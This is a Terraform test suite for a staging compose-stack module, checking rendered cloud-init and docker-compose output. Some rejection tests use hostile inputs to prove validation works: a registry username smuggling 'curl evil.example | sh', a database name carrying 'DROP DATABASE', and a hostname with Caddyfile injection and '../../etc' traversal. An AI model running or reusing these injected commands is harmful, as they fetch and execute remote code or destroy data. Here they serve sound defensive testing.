# Rendering tests for the compose-stack templates. `command = apply` is
# required because the templates interpolate random_password (unknown at plan
# time) — but the module's only resource IS that in-memory random string, so
# these tests create NOTHING outside the test process: no cloud account, no
# credentials, no network.
#
# Run from the module directory: terraform init && terraform test

variables {
  exchange_hostname = "exchange.staging.example"
  broker_hostname   = "broker.staging.example"
  identity_hostname = "mcp.staging.example"
  zitadel_hostname  = "login.staging.example"

  # The publisher hostname, deliberately NOT the exchange one — that difference
  # is the whole point of the variable (see the default-tenant test below).
  default_tenant_domain = "demo.staging.example"

  exchange_image = "registry.example.com/group/proj/exchange:test"
  broker_image   = "registry.example.com/group/proj/broker:test"
  identity_image = "registry.example.com/group/proj/identity:test"

  acme_email = "ops@example.com"

  # Dummy key material — shape only, never used cryptographically. The broker
  # identity payload decodes to exactly 64 bytes because the variable's
  # validation counts them; the plain-English plaintext keeps the fixture
  # recognizably fake.
  ed25519_private_pem     = "-----BEGIN PRIVATE KEY-----\ndGVzdA==\n-----END PRIVATE KEY-----\n"
  rsa_private_pem         = "-----BEGIN RSA PRIVATE KEY-----\ndGVzdA==\n-----END RSA PRIVATE KEY-----\n"
  broker_relay_key_json   = "{\"kid\":\"broker.test.v1\"}"
  broker_identity_key_pem = "-----BEGIN ED25519 PRIVATE KEY-----\nZmFrZSBicm9rZXIgaWRlbnRpdHkgZml4dHVyZTogZXhhY3RseSBzaXh0eS1mb3VyIGJ5dGVzIGZvciB0ZnRlcw==\n-----END ED25519 PRIVATE KEY-----\n"
}

run "tigerbeetle_billing_wires_ledger_and_static_ip" {
  command = apply

  assert {
    condition     = strcontains(output.compose_yaml, "tigerbeetle:")
    error_message = "billing_adapter=tigerbeetle (default) must include the TigerBeetle service"
  }

  assert {
    condition     = strcontains(output.compose_yaml, "EXCHANGE_BILLING_TB_ADDRESS: \"172.28.0.10:3000\"")
    error_message = "Exchange must point at TigerBeetle's static IP (the env var rejects hostnames)"
  }

  assert {
    condition     = strcontains(output.compose_yaml, "ipv4_address: 172.28.0.10")
    error_message = "TigerBeetle must be pinned to the static IPAM address"
  }

  assert {
    condition     = strcontains(output.compose_yaml, "RAMP_BILLING_ADAPTER: \"tigerbeetle\"")
    error_message = "Exchange billing adapter env must carry the requested adapter"
  }

  assert {
    condition     = strcontains(output.compose_yaml, "EXCHANGE_BILLING_LEDGER: \"978\"")
    error_message = "Exchange must carry the ledger currency — the tigerbeetle adapter refuses to boot without EXCHANGE_BILLING_LEDGER"
  }

  assert {
    condition     = length(regexall("- \"seccomp=unconfined\"", output.compose_yaml)) == 2
    error_message = "Both the tigerbeetle service AND the Exchange (embedded io_uring client) need the seccomp exception under Docker >= 25"
  }

  # Two, not three: the Identity Service is behind the same Caddy but only
  # SIGNS outbound RAMP requests — it never verifies an inbound RFC 9421
  # signature, so it has no request target to reconstruct and nothing to
  # derive from X-Forwarded-Proto. Raise this count only for a service that
  # verifies inbound signatures.
  assert {
    condition     = length(regexall("RAMP_TRUST_PROXY_HEADERS: \"true\"", output.compose_yaml)) == 2
    error_message = "Exchange AND Broker sit behind Caddy's TLS termination — both must trust X-Forwarded-Proto or signature verification runs against the plain-HTTP socket scheme"
  }
}

run "free_billing_drops_tigerbeetle" {
  command = apply

  variables {
    billing_adapter = "free"
  }

  assert {
    condition     = !strcontains(output.compose_yaml, "tigerbeetle")
    error_message = "billing_adapter=free must not render any TigerBeetle service, address, or volume"
  }

  assert {
    condition     = !strcontains(output.compose_yaml, "EXCHANGE_BILLING_LEDGER")
    error_message = "billing_adapter=free must not render the tigerbeetle-only ledger env var"
  }

  assert {
    condition     = !strcontains(output.compose_yaml, "seccomp")
    error_message = "billing_adapter=free must not loosen seccomp on any service"
  }
}

run "unsupported_billing_ledger_is_rejected" {
  command = plan

  variables {
    billing_ledger = "392"
  }

  expect_failures = [var.billing_ledger]
}

run "production_posture_env_wiring" {
  command = apply

  assert {
    condition     = strcontains(output.compose_yaml, "EXCHANGE_PUBLIC_ORIGIN: \"https://exchange.staging.example\"")
    error_message = "Exchange public origin must be the https service hostname"
  }

  assert {
    condition     = strcontains(output.compose_yaml, "EXCHANGE_BROKER_WELLKNOWN_URL: \"https://broker.staging.example/.well-known/ramp.json\"")
    error_message = "Exchange must point at the Broker's public well-known URL (fail-closed revocation authority)"
  }

  assert {
    condition     = !strcontains(output.compose_yaml, "SKIP_SSRF") && !strcontains(output.compose_yaml, "ALLOW_INSECURE")
    error_message = "The compose-network-only insecure overrides must never appear in the staging bundle"
  }

  assert {
    condition     = strcontains(output.compose_yaml, "BROKER_DOMAIN: \"broker.staging.example\"")
    error_message = "Broker domain must be the public hostname"
  }
}

run "broker_identity_key_is_persistent_not_ephemeral" {
  command = apply

  assert {
    condition     = strcontains(output.compose_yaml, "BROKER_ED25519_KEY_FILE: \"/keys/broker-identity-key.pem\"")
    error_message = "The Broker refuses to boot without an identity key — the key file must be wired into its environment"
  }

  # The key travels as a root-owned file under the per-service key directory,
  # like every other private key. Both the path AND the body are asserted in
  # user_data: the path alone would stay green if the content interpolation
  # were dropped, shipping an empty key file.
  assert {
    condition     = strcontains(output.user_data, "/opt/ramp/keys/broker/broker-identity-key.pem") && strcontains(output.user_data, "ZmFrZSBicm9rZXIgaWRlbnRpdHkgZml4dHVyZTogZXhhY3RseSBzaXh0eS1mb3VyIGJ5dGVzIGZvciB0ZnRlcw==")
    error_message = "The identity key — path and content — must land in the Broker's key directory via cloud-init"
  }

  # The rendered compose file is world-readable on the VM, so neither the seed
  # env var nor the PEM body may appear in it. "BROKER_ED25519_SEED:" with the
  # trailing colon — the env-key form — because a template comment legitimately
  # names the variable in prose when explaining why it is NOT used.
  assert {
    condition     = !strcontains(output.compose_yaml, "BROKER_ED25519_SEED:") && !strcontains(output.compose_yaml, "ZmFrZSBicm9rZXIgaWRlbnRpdHkgZml4dHVyZTogZXhhY3RseSBzaXh0eS1mb3VyIGJ5dGVzIGZvciB0ZnRlcw==")
    error_message = "No identity key material in the compose file — it is written world-readable on the VM; the key ships only as the 0640 root:65532 key file"
  }

  # The opt-out exists for development and CI. Under it the Broker mints a new
  # identity on every restart while still publishing a 90-day validity window
  # for it in its WBA directory, so a staging stack on a public hostname must
  # never render it.
  assert {
    condition     = !strcontains(output.compose_yaml, "BROKER_ALLOW_EPHEMERAL_KEY")
    error_message = "The ephemeral-key opt-out must never appear in the staging bundle"
  }

  # Distinct keys, distinct files. Equal values would mean one identity doing
  # both jobs, which is not what either loader expects.
  assert {
    condition     = strcontains(output.compose_yaml, "BROKER_RELAY_KEY_FILE: \"/keys/broker-relay-key.json\"")
    error_message = "The relay key must still be delivered as its own mounted file, separate from the identity key"
  }
}

run "non_pem_broker_identity_key_is_rejected" {
  command = plan

  variables {
    # The seed shape the variable used to take — a paste-through of the old
    # value must fail the plan, not crash-loop the Broker on a non-PEM file.
    broker_identity_key_pem = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
  }

  expect_failures = [
    var.broker_identity_key_pem,
  ]
}

run "openssl_pkcs8_broker_identity_key_is_rejected" {
  command = plan

  variables {
    # The MOST LIKELY wrong file: `openssl genpkey -algorithm ED25519` output.
    # Its label lacks ED25519 and its PKCS#8 payload is 48 bytes, not 64 — the
    # Broker's loader rejects it at runtime, so the plan must reject it first.
    # (Payload here is a structurally real 48-byte PKCS#8 shape.)
    broker_identity_key_pem = "-----BEGIN PRIVATE KEY-----\nMC4CAQAwBQYDK2VwBCIEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n-----END PRIVATE KEY-----\n"
  }

  expect_failures = [
    var.broker_identity_key_pem,
  ]
}

run "truncated_broker_identity_key_is_rejected" {
  command = plan

  variables {
    # Right label, short payload — an interrupted copy-paste. The 88-character
    # count check has to catch what the label check cannot.
    broker_identity_key_pem = "-----BEGIN ED25519 PRIVATE KEY-----\nZmFrZSBicm9rZXIgaWRlbnRpdHkgZml4dHVyZQ==\n-----END ED25519 PRIVATE KEY-----\n"
  }

  expect_failures = [
    var.broker_identity_key_pem,
  ]
}

run "default_tenant_is_the_publisher_not_the_exchange" {
  command = apply

  assert {
    condition     = strcontains(output.compose_yaml, "EXCHANGE_DEFAULT_TENANT: \"demo.staging.example\"")
    error_message = "Register reads its activation policy from the tenant the seed step creates, which is under the publisher hostname"
  }

  # The binary falls back to EXCHANGE_DOMAIN when this is unset. That silently
  # points Register at the Exchange's own hostname, where no tenant row exists,
  # so every Register fails and no agent ever gets a billing_ref to be charged
  # against. An empty value is the same as unset.
  assert {
    condition     = !strcontains(output.compose_yaml, "EXCHANGE_DEFAULT_TENANT: \"\"") && !strcontains(output.compose_yaml, "EXCHANGE_DEFAULT_TENANT: \"exchange.staging.example\"")
    error_message = "An empty or exchange-hostname default tenant is the broken fallback this variable exists to prevent"
  }
}

run "empty_default_tenant_is_rejected" {
  command = plan

  # "" is the same trap as unset: the binary treats an empty env var as absent
  # and falls back to EXCHANGE_DOMAIN, where no tenant row exists. The render
  # assert above cannot catch this (the fixture always supplies a value), so
  # the variable's own validation has to.
  variables {
    default_tenant_domain = ""
  }

  expect_failures = [
    var.default_tenant_domain,
  ]
}

run "sor_database_is_created_unconditionally" {
  command = apply

  assert {
    condition     = strcontains(output.user_data, "CREATE DATABASE sor;")
    error_message = "The Exchange's System of Record owns a separate database and migrates but never creates it — the module must create it whether or not the caller sets extra_databases"
  }

  assert {
    condition     = strcontains(output.compose_yaml, "postgres:5432/sor?sslmode=disable")
    error_message = "EXCHANGE_SOR_DSN must point at that database — RAMP_SOR_ADAPTER defaults to postgres and has no 'off', so an unset DSN fails the boot"
  }

  # The SoR is a SECOND pool. Pointing both at `ramp` would run the SoR
  # migrations into the Exchange's own database, which is not the contract the
  # adapter documents.
  assert {
    condition     = length(regexall("EXCHANGE_SOR_DSN: \"[^\"]*/ramp\\?sslmode=disable\"", output.compose_yaml)) == 0
    error_message = "The SoR DSN must address its own database, not the shared ramp one"
  }
}

run "publisher_origin_is_optional" {
  command = apply

  assert {
    condition     = !strcontains(output.compose_yaml, "publisher:")
    error_message = "No origin_hostname -> no publisher service in the bundle"
  }
}

run "publisher_origin_renders_when_configured" {
  command = apply

  variables {
    origin_hostname = "origin.staging.example"
    publisher_image = "registry.example.com/group/proj/publisher:test"
  }

  assert {
    condition     = strcontains(output.compose_yaml, "publisher:")
    error_message = "origin_hostname set -> publisher service must be in the bundle"
  }

  assert {
    condition     = strcontains(output.user_data, "origin.staging.example")
    error_message = "Caddy must get a site block for the origin hostname"
  }
}

run "registry_login_only_with_credentials" {
  command = apply

  assert {
    condition     = !strcontains(output.user_data, "docker login")
    error_message = "No registry credentials -> first boot must not run docker login"
  }
}

run "registry_login_renders_with_credentials" {
  command = apply

  variables {
    registry_server   = "registry.example.com"
    registry_username = "deploy-token-user"
    registry_password = "deploy-token-secret"
  }

  assert {
    condition     = strcontains(output.user_data, "docker login registry.example.com")
    error_message = "Registry credentials set -> first boot must log in before compose up"
  }

  assert {
    condition     = !strcontains(output.user_data, "deploy-token-secret")
    error_message = "The raw registry password must never appear in user data — only its base64 file content"
  }

  assert {
    condition     = strcontains(output.user_data, "--password-stdin < /opt/ramp/.registry-password")
    error_message = "docker login must read the password from the root-only file, not a command-line argument"
  }
}

run "key_material_lands_in_cloud_init" {
  command = apply

  assert {
    condition     = strcontains(output.user_data, "-----BEGIN PRIVATE KEY-----")
    error_message = "Ed25519 PEM must be written to the VM via cloud-init"
  }

  assert {
    condition     = strcontains(output.user_data, "/opt/ramp/keys/exchange/rsa-private.pem")
    error_message = "RSA PEM file must be written when rsa_private_pem is set"
  }

  assert {
    condition     = strcontains(output.compose_yaml, "RAMP_RSA_PRIVATE_PEM_FILE")
    error_message = "Exchange must reference the RSA key file when rsa_private_pem is set"
  }

  assert {
    condition     = strcontains(output.user_data, "chown -R root:65532 /opt/ramp/keys") && strcontains(output.user_data, "-type f -exec chmod 0640")
    error_message = "Keys must be re-owned root:65532 and opened to 0640 before compose starts — group read for the nonroot services, nothing for other local users"
  }

  assert {
    condition     = !strcontains(output.user_data, "permissions: \"0644\"\n    content: |\n      -----BEGIN")
    error_message = "Key files must not be written world-readable"
  }

  assert {
    condition     = strcontains(output.user_data, "/opt/ramp/keys/exchange/ed25519-private.pem") && strcontains(output.user_data, "/opt/ramp/keys/broker/broker-relay-key.json")
    error_message = "Each private key must land in its own service's directory"
  }

  assert {
    condition     = !strcontains(output.compose_yaml, "- /opt/ramp/keys:/keys:ro")
    error_message = "No container may mount the whole keys tree — each service gets only its own key directory, so a compromise of one does not expose another's signing identity"
  }
}

run "rsa_key_renders_when_supplied" {
  command = apply

  assert {
    condition     = strcontains(output.compose_yaml, "RAMP_RSA_PRIVATE_PEM_FILE: \"/keys/rsa-private.pem\"")
    error_message = "A supplied RSA key must reach the Exchange, or a CloudFront tenant cannot be served"
  }

  assert {
    condition     = strcontains(output.user_data, "/opt/ramp/keys/exchange/rsa-private.pem")
    error_message = "A supplied RSA key must be written to the VM, or the env var above points at nothing"
  }
}

run "rsa_key_is_optional" {
  command = apply

  # The Exchange needs an RSA key only for AWS_CLOUDFRONT_RSA tenants. It starts
  # without one and refuses just the requests that would need it, naming the
  # setting to add — so a stack whose every tenant is on the ED25519 scheme must
  # not be forced to generate and mount a key nothing reads.
  variables {
    rsa_private_pem = null
  }

  assert {
    condition     = !strcontains(output.compose_yaml, "RAMP_RSA_PRIVATE_PEM_FILE")
    error_message = "No rsa_private_pem -> the Exchange must not be pointed at an RSA key file that was never written"
  }

  assert {
    condition     = !strcontains(output.user_data, "rsa-private.pem")
    error_message = "No rsa_private_pem -> no RSA key file on the VM"
  }

  # The Ed25519 key is a different matter: every tenant signs offers with it, so
  # it must still be there.
  assert {
    condition     = strcontains(output.compose_yaml, "RAMP_ED25519_PRIVATE_PEM_FILE: \"/keys/ed25519-private.pem\"")
    error_message = "The Ed25519 key stays mandatory — dropping the RSA requirement must not loosen that one"
  }
}

run "acme_staging_toggle" {
  command = apply

  variables {
    acme_staging = true
  }

  assert {
    condition     = strcontains(output.user_data, "acme-staging-v02.api.letsencrypt.org")
    error_message = "acme_staging=true must switch Caddy to the Let's Encrypt staging CA"
  }
}

run "acme_production_by_default" {
  command = apply

  assert {
    condition     = !strcontains(output.user_data, "acme-staging-v02")
    error_message = "acme_staging defaults off -> no staging CA in the Caddyfile"
  }
}

run "static_wba_directories_render_caddy_site_blocks" {
  command = apply

  variables {
    # Multi-line and containing a backtick-adjacent shape on purpose: the
    # document must reach the VM byte-for-byte through cloud-init's b64
    # channel, never through Caddyfile or shell quoting. Schema-conforming —
    # the variable validation refuses anything less (see the rejection runs
    # below).
    static_wba_directories = {
      "smoke-agent.staging.example" = "{\n  \"keys\": [\n    {\"kty\": \"OKP\", \"crv\": \"Ed25519\", \"use\": \"sig\", \"alg\": \"EdDSA\",\n     \"x\": \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQ\",\n     \"not_before\": \"2026-08-04T00:00:00Z\", \"not_after\": \"2026-11-02T00:00:00Z\"}\n  ]\n}\n"
    }
  }

  assert {
    condition     = strcontains(output.user_data, "smoke-agent.staging.example {")
    error_message = "each static_wba_directories hostname must get its own Caddy site block"
  }
  assert {
    # The document lands as a base64-delivered file for Caddy's file_server —
    # NOT interpolated into the Caddyfile, where a legal JSON backtick would
    # end the quoted token and the rest would parse as proxy configuration.
    condition     = strcontains(output.user_data, "path: /opt/ramp/wba/smoke-agent.staging.example.json")
    error_message = "each document must be written to /opt/ramp/wba/<hostname>.json by cloud-init"
  }
  assert {
    condition     = strcontains(output.user_data, base64encode("{\n  \"keys\": [\n    {\"kty\": \"OKP\", \"crv\": \"Ed25519\", \"use\": \"sig\", \"alg\": \"EdDSA\",\n     \"x\": \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQ\",\n     \"not_before\": \"2026-08-04T00:00:00Z\", \"not_after\": \"2026-11-02T00:00:00Z\"}\n  ]\n}\n"))
    error_message = "the document must reach the VM byte-for-byte (base64-encoded in cloud-init)"
  }
  assert {
    condition     = strcontains(output.user_data, "file_server") && !strcontains(output.user_data, "respond `")
    error_message = "the directory must be served from the written file, never from an interpolated respond body"
  }
  assert {
    condition     = strcontains(output.user_data, "application/jwk-set+json")
    error_message = "the directory must be served with the JWK Set media type"
  }
  assert {
    condition     = strcontains(output.compose_yaml, "- /opt/ramp/wba:/srv/wba:ro")
    error_message = "the Caddy container must mount the written directory read-only"
  }
}

run "wba_directory_missing_schema_member_is_rejected" {
  command = plan

  variables {
    # `use` is omitted. Without the variable validation this document deploys
    # cleanly, serves 200, and fails the first signed request with an error
    # that points at the signature — the validation moves that failure to
    # `terraform plan`.
    static_wba_directories = {
      "smoke-agent.staging.example" = "{\"keys\":[{\"kty\":\"OKP\",\"crv\":\"Ed25519\",\"alg\":\"EdDSA\",\"x\":\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQ\",\"not_before\":\"2026-08-04T00:00:00Z\",\"not_after\":\"2026-11-02T00:00:00Z\"}]}"
    }
  }

  expect_failures = [
    var.static_wba_directories,
  ]
}

run "wba_directory_padded_x_is_rejected" {
  command = plan

  variables {
    # A padded (44-character, trailing "=") x: standard base64 instead of the
    # unpadded base64url the schema requires. Same failure mode as a missing
    # member — verifiers cannot match the key.
    static_wba_directories = {
      "smoke-agent.staging.example" = "{\"keys\":[{\"kty\":\"OKP\",\"crv\":\"Ed25519\",\"use\":\"sig\",\"alg\":\"EdDSA\",\"x\":\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOP=\",\"not_before\":\"2026-08-04T00:00:00Z\",\"not_after\":\"2026-11-02T00:00:00Z\"}]}"
    }
  }

  expect_failures = [
    var.static_wba_directories,
  ]
}

run "wba_directory_malformed_hostname_key_is_rejected" {
  command = plan

  variables {
    # The KEY is the half that reaches rendered configuration verbatim (Caddy
    # site block, rewrite target, cloud-init write_files path) — here it
    # carries a Caddyfile brace and a path separator. The document is
    # schema-conforming on purpose: only the hostname validation can reject
    # this input.
    static_wba_directories = {
      "bad host {\nrespond `owned`\n} ignore/../../etc" = "{\"keys\":[{\"kty\":\"OKP\",\"crv\":\"Ed25519\",\"use\":\"sig\",\"alg\":\"EdDSA\",\"x\":\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQ\",\"not_before\":\"2026-08-04T00:00:00Z\",\"not_after\":\"2026-11-02T00:00:00Z\"}]}"
    }
  }

  expect_failures = [
    var.static_wba_directories,
  ]
}

run "no_static_wba_directories_by_default" {
  command = apply

  assert {
    # application/jwk-set+json is written only by the static-directory site
    # block, so its absence proves the block is not rendered. The path string
    # alone would not discriminate — the compose file names other well-known
    # URLs.
    condition     = !strcontains(output.user_data, "application/jwk-set+json")
    error_message = "with no static_wba_directories the Caddyfile must carry no directory site block"
  }
  assert {
    condition     = !strcontains(output.compose_yaml, "/srv/wba")
    error_message = "with no static_wba_directories the Caddy container must not mount the directory volume"
  }
}

run "extra_databases_render_in_init_sql" {
  command = apply

  variables {
    extra_databases = ["ramp_b", "ramp_c"]
  }

  assert {
    condition     = strcontains(output.user_data, "CREATE DATABASE ramp_b;") && strcontains(output.user_data, "CREATE DATABASE ramp_c;")
    error_message = "extra_databases must become CREATE DATABASE statements in the init SQL"
  }
}

run "identity_database_is_created_unconditionally" {
  command = apply

  assert {
    condition     = strcontains(output.user_data, "CREATE DATABASE identity;")
    error_message = "The Identity Service owns a separate database — the module must create it whether or not the caller sets extra_databases"
  }

  assert {
    condition     = strcontains(output.compose_yaml, "postgres:5432/identity?sslmode=disable")
    error_message = "IDENTITY_DSN must point at that database, not the shared ramp one"
  }
}

run "identity_plane_is_wired" {
  command = apply

  assert {
    condition = alltrue([
      for svc in ["identity:", "identity-vault:", "zitadel:", "zitadel-db:"] :
      strcontains(output.compose_yaml, svc)
    ])
    error_message = "The identity plane is an unconditional part of the bundle: service, key store, OIDC provider, and its database"
  }

  assert {
    condition     = strcontains(output.compose_yaml, "IDENTITY_BASE_DOMAIN: \"mcp.staging.example\"") && strcontains(output.compose_yaml, "IDENTITY_AUTH_ISSUER: \"https://mcp.staging.example\"")
    error_message = "The service's own zone and issuer must both be its public hostname — agent directories hang off the first, the registered OAuth redirect URI off the second"
  }

  assert {
    condition     = strcontains(output.compose_yaml, "IDENTITY_OIDC_ISSUER: \"https://login.staging.example\"")
    error_message = "The upstream OIDC issuer must be Zitadel's PUBLIC URL — a compose-network address would not match what the developer's browser is redirected to"
  }

  assert {
    condition     = strcontains(output.compose_yaml, "IDENTITY_MCP_BROKER_URL: \"http://broker:8082\"") && strcontains(output.compose_yaml, "IDENTITY_MCP_EXCHANGE_URL: \"http://exchange:8081\"")
    error_message = "The RAMP legs the MCP tools drive are in-network hops"
  }

  assert {
    condition     = strcontains(output.user_data, "reverse_proxy identity:8083") && strcontains(output.user_data, "reverse_proxy zitadel:8080")
    error_message = "Caddy must front both the Identity Service and Zitadel"
  }

  assert {
    condition     = strcontains(output.user_data, "*.mcp.staging.example") && strcontains(output.user_data, "on_demand")
    error_message = "Agent directory subdomains do not exist until sign-up, so the wildcard site must issue certificates on demand"
  }

  assert {
    condition     = strcontains(output.user_data, "ask http://identity:8083/healthz")
    error_message = "on-demand issuance without an ask endpoint would attempt a certificate for any name presented in SNI"
  }
}

run "identity_secrets_are_generated_not_ephemeral" {
  command = apply

  assert {
    condition     = strcontains(output.compose_yaml, "IDENTITY_SESSION_KEY: ") && strcontains(output.compose_yaml, "IDENTITY_TOKEN_SIGNING_KEY: ")
    error_message = "Both must be set explicitly: left unset the service invents them per boot and every live session and issued bearer dies on restart"
  }

  assert {
    condition     = !strcontains(output.compose_yaml, "IDENTITY_SESSION_KEY: \"\"") && !strcontains(output.compose_yaml, "IDENTITY_TOKEN_SIGNING_KEY: \"\"")
    error_message = "An empty value is the same as unset — the service would fall back to an ephemeral key"
  }

  assert {
    condition     = length(nonsensitive(output.zitadel_admin_password)) >= 24
    error_message = "The Zitadel console admin password must be generated, not the published laptop-fixture default"
  }

  assert {
    condition     = !strcontains(output.user_data, "ZAdmin123!")
    error_message = "deploy/zitadel/init-steps.yaml is a laptop fixture with a password published in the repository — the staging instance is internet-reachable and must not inherit it"
  }
}

run "fully_loaded_user_data_fits_the_ec2_limit" {
  command = apply

  # Every optional block staging turns on at once — publisher origin, registry
  # login, the EXA key — because the limit has to hold for the LARGEST
  # cloud-init the module can emit, not the fixture's minimum. The RSA key is
  # optional too (see rsa_key_is_optional), but the fixture defaults already
  # supply it, so this run carries it without listing it here.
  variables {
    origin_hostname   = "origin.staging.example"
    publisher_image   = "registry.example.com/group/proj/publisher:test"
    registry_server   = "registry.example.com"
    registry_username = "gitlab+deploy-token-123456"
    registry_password = "glpat-XXXXXXXXXXXXXXXXXXXX"
    exa_api_key       = "00000000-0000-0000-0000-000000000000"
  }

  # EC2 caps user data at 16384 bytes. aws-vm submits it gzipped, and Terraform
  # can only measure the base64 of those bytes: base64 of n bytes is
  # 4*ceil(n/3) characters, so 16384 bytes is 21848 characters. Comparing with
  # `<` keeps the check on the safe side of the rounding.
  #
  # This is the assertion the identity plane made necessary — it added four
  # services, their secrets, and Zitadel's init steps to a bundle that had no
  # size guard at all. If it ever trips, the fix is NOT to trim comments out of
  # the templates: it is to stop inlining the bundle and fetch it at boot,
  # which is a design change worth making deliberately.
  assert {
    condition     = length(base64gzip(output.user_data)) < 21848
    error_message = "Rendered cloud-init exceeds EC2's 16 KB user-data limit — the instance would fail to launch"
  }

  # Documents why aws-vm gzips rather than submitting the text: uncompressed,
  # this bundle is already well past the limit.
  assert {
    condition     = length(output.user_data) > 16384
    error_message = "Cloud-init is expected to exceed the raw limit; if it no longer does, the compression in aws-vm is load-bearing for a reason that has changed"
  }
}

run "invalid_billing_adapter_is_rejected" {
  command = plan

  variables {
    billing_adapter = "stripe"
  }

  expect_failures = [
    var.billing_adapter,
  ]
}

run "origin_without_publisher_image_is_rejected" {
  command = plan

  variables {
    origin_hostname = "origin.staging.example"
  }

  expect_failures = [
    random_password.postgres,
  ]
}

run "shell_shaped_registry_username_is_rejected" {
  command = plan

  variables {
    registry_server   = "registry.example.com"
    registry_username = "user'; curl evil.example | sh #"
    registry_password = "token"
  }

  expect_failures = [
    var.registry_username,
  ]
}

run "sql_shaped_extra_database_is_rejected" {
  command = plan

  variables {
    extra_databases = ["ramp_b; DROP DATABASE ramp"]
  }

  expect_failures = [
    var.extra_databases,
  ]
}

run "undersized_network_subnet_is_rejected" {
  command = plan

  variables {
    network_subnet = "not-a-cidr"
  }

  expect_failures = [
    var.network_subnet,
  ]
}

run "registry_server_without_credentials_is_rejected" {
  command = plan

  variables {
    registry_server = "registry.example.com"
  }

  expect_failures = [
    random_password.postgres,
  ]
}

run "registry_credentials_without_server_are_rejected" {
  command = plan

  variables {
    registry_username = "deploy-token-user"
    registry_password = "token"
  }

  expect_failures = [
    random_password.postgres,
  ]
}
